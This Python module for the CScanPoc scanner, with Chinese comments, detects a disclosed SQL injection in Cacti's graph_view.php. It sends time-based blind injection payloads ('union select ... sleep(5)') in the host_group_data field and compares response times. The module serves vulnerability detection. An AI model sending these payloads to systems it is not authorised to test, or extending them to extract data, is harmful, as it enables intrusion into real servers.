# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'Cacti_0004_L'  # 平台漏洞编号
    name = 'Cacti SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-04-08'  # 漏洞公布时间
    desc = '''
        Cacti是一套网络流量监测图形分析工具。它有非常强大的数据和用户管理功能，可以指定每一个用户能查看树状结 构、host以及任何一张图，还可以与LDAP结合进行用户验证，同时也能自己增加模板，功能非常强大。
        存在问题的文件/cacti/graph_view.php:
        过滤不严格导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3826/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Cacti'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '72fd1570-3236-4f18-a501-12c557d90ac0'  # 平台 POC 编号
    author = '47bwy'  # POC编写者
    create_date = '2018-06-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 首先登陆cacti
            s = requests.session()
            # 获取cookies
            cookies = {}
            '''
            raw_cookies = 'bid=xxxxx;_pk_ref.100001.8cb4=xxxxxxx;__utma=xxxxx'
            for line in raw_cookies.split(';'):  
                key,value=line.split('=',1)#1代表只分一次，得到两个数据  
                cookies[key]=value 
            '''
            url = self.target + '/cacti/graph_view.php'
            s.get(url, cookies=cookies)
            data_sleep = "__csrf_magic=sid:b0349195c55bddec2f2be859e0f394539ea4569a,1458781575&host_group_data=graph_template:1 union select case when ord(substring((select version()) from 1 for 1)) between 53 and 53 then sleep(5) else 0 end"
            data_normal = "__csrf_magic=sid:b0349195c55bddec2f2be859e0f394539ea4569a,1458781575&host_group_data=graph_template:1 union select case when ord(substring((select version()) from 1 for 1)) between 53 and 53 then md5(c) else 0 end"
            time_start = time.time()
            s.post(url, data_normal)
            time_end_normal = time.time()
            s.post(url, data_sleep)
            time_end_sleep = time.time()

            if (time_end_sleep-time_end_normal)-(time_end_normal-time_start) > 4:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
